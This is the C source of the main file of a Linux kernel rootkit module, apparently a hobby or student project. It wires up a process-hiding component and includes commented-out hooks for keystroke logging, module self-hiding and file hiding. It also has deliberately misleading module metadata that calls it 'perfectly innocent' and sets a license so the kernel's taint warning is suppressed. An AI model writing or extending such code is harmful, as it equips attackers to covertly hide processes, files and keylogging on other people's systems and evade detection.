//TODO: put init macros back..
//TODO: extract kprintfs to one file to make them easier to enable / disable

#include <linux/module.h>	 // For moduless
#include <linux/init.h>	

#include "common.h"
// #include "logInput.h"
// #include "moduleHide.h"
// #include "fileHide.h"
// #include "outputDevice.h"
#include "processHider.h"

//TODO: rename this to if wanting to be able to remove rootkit
#define DEV_MODE


//TODO: check if when an init function fails that the parts of the rootkit which were installed are removed.
static int __init main_init(void) {
	int error;
	printk("Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
	printk("Syscall table is located at: %p\n", (void *) SYSCALL_TABLE);

//	
//	error = outputDevice_init();
//	if (error) return error;
//	
//#ifndef DEV_MODE
//	error = logInput_init();
//	if (error) return error;
//	
//	error = moduleHide_start();
//	if (error) return error;
//#endif
//
//	error = fileHide_start();
//	if (error) return error;
	
	error = processHider_init();
	if (error) return error;

	printk(KERN_INFO "Rootkit installed\n");
	return 0;
}

static void __exit main_exit(void) {
	
// 	fileHide_stop();
// #ifndef DEV_MODE
// 	moduleHide_stop();
// 	logInput_exit();
// #endif
// 	outputDevice_exit();
	processHider_exit();

	printk(KERN_INFO "Rootkit uninstalled\n");
}



// Get rid of taint message
MODULE_LICENSE("GPL"); // note: GPL is required if using the functions create_class / create_device.. (http://forums.fedoraforum.org/showthread.php?t=97742)
MODULE_AUTHOR("Innocent authors");
MODULE_DESCRIPTION("This is a perfectly innocent module and has nothing to do with rootkits whatsoever :)");

module_init(main_init);
module_exit(main_exit);	 // For init macros
//#include <linux/tty.h> /* console_print() interface */
